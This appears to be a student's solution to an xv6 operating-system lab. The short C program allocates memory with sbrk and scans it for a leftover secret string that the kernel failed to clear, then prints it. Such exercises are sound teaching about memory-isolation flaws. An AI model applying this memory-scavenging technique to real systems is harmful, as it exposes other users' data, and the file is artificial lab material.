#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

void main(void) {
    // Allocate a large memory block (e.g., 30 pages) to reclaim the memory
    int size = 4096 * 30; 
    char *mem = sbrk(size); 
    
    if ((long long)mem == -1) {
        exit(1); 
    }

    // Loop through the allocated memory, searching for the leaked secret string.
    for (int i = 0; i < size; i++) {
        // Look for the start of a printable ASCII string
        if (mem[i] >= 'a' && mem[i] <= 'z') { 
            
            int len = 0;
            while (mem[i + len] != 0 && len < 20) {
                len++;
            }
            
            if (len >= 3 && len < 20) {
                // Print the potential secret and exit successfully
                printf("%s\n", &mem[i]);
                exit(0);
            }
        }
    }
    
    exit(0);
}
